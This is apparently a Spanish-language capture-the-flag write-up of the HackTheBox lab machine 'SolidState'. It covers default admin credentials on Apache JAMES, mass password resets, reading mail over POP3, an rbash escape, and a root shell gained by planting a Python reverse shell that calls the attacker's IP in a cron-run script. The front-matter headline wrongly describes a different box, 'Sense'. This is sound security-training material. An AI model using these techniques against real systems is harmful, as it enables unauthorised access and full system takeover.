---
layout : post
author: X4v1l0k
title: SolidState Writeup [HTB]
date: 2020-11-09 09:15:00 +/- 0000
categories: [Machine-Writeup, HackTheBox]
tags: [CVE,Telnet,POP3,Rbash,Cron,OSCP Path]
headline: Sense is a beginner-friendly OpenBSD machine from Hackthebox, where we will enumerate files and directories and exploit an RCE that will grant us root.
image: https://www.hackthebox.eu/storage/avatars/cfb87d43d2b47380fd0f3a3efb6a47ed.png
---

SolidState - 10.10.10.51
===
![](https://www.hackthebox.eu/storage/avatars/cfb87d43d2b47380fd0f3a3efb6a47ed.png)
###### tags: `HTB` `Medium` `Linux`

# Enumeración
## Nmap

```bash
$ nmap -A -Pn -p- 10.10.10.51

Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-09 01:21 CET
Nmap scan report for 10.10.10.51
Host is up (0.034s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.35 [10.10.14.35]), 
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2

Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   33.46 ms 10.10.14.1
2   33.67 ms 10.10.10.51

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.03 seconds
```

## Directorios

```bash
$ gobuster dir -u http://10.10.10.51/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,tar,zip,html -k -t 50

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.51/
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,bak,tar,zip,html
[+] Timeout:        10s
===============================================================
2020/11/09 01:26:50 Starting gobuster
===============================================================
/images (Status: 301)
/index.html (Status: 200)
/about.html (Status: 200)
/services.html (Status: 200)
/assets (Status: 301)
/README.txt (Status: 200)
/LICENSE.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2020/11/09 01:44:26 Finished
===============================================================
```

Al puerto 4555 podemos conectarnos por nc. Veamos si tiene las credenciales por defecto.

```bash
$ nc 10.10.10.51 4555

JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
help
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user`s password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user`s current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user`s current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit
```

Por lo que veo, podemos listar los usuarios existentes y cambiar sus contraseñas a la que queramos y así poder leer sus correos.

```bash
$ listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
$ setpassword james james
Password for james reset
$ setpassword thomas thomas
Password for thomas reset
$ setpassword john john
Password for john reset
$ setpassword mindy mindy
Password for mindy reset
$ setpassword mailadmin mailadmin
Password for mailadmin reset
```

Ahora, vamos a explorar los buzones de correo.

```bash
telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER john
+OK
PASS john
+OK Welcome john
LIST
+OK 1 743
1 743
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy`s access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James

.
Connection closed by foreign host.
```

Pues vamos a leer el buzón de mindy.

```bash
telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS mindy
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

Ahora tenemos las credenciales de mindy.

# Explotación
Con las credenciales encontradas, podemos conectarnos por SSH como mindy pero, nos vamos a encontrar dentro de rbash por lo que tendremos que "escapar de la carcel".

Para poder escapar de rbash, podemos conectarnos a SSH de este modo.

```bash
$ ssh mindy@10.10.10.51  -t "bash --noprofile"

${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
```

# Post explotación
## Enumeración
### Sudo

### Linpeas

```bash
root       393  0.6  6.6 435508 33612 ?        Sl   03:23   0:01 /usr/lib/jvm/java-8-openjdk-i386//bin/java -Djava.ext.dirs=/opt/james-2.3.2/lib:/opt/james-2.3.2/tools/lib -Djava.security.manager -Djava.security.policy=jar:file:/opt/james-2.3.2/bin/phoenix-loader.jar!/META-INF/java.policy -Dnetworkaddress.cache.ttl=300 -Dphoenix.home=/opt/james-2.3.2 -Djava.io.tmpdir=/opt/james-2.3.2/temp -jar /opt/james-2.3.2/bin/phoenix-loader.jar
```

## Escala de privilegios

Vamos a revisar el directorio opt/james-2.3.2/

Dentro del directorio, encontramos una aplicación con varios scripts y justo en el directorio pardre /opt/ nos encontramos otros script llamado tmp.py sobre el cual tenemos permisos de escritura. Este script debe estar siendo llamado por una tarea Cron yaque los scripts de enumeración que había guardado en /tmp se me han borrado y, este es el contenido del script.

```python=
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

Vamos a modificarlo para obtener una shell la proxima vez que se ejecute.

```python=
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.35",8787))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);
```

Ponemos un listener, esperamos unos segundos y... tenemos la shell como root!.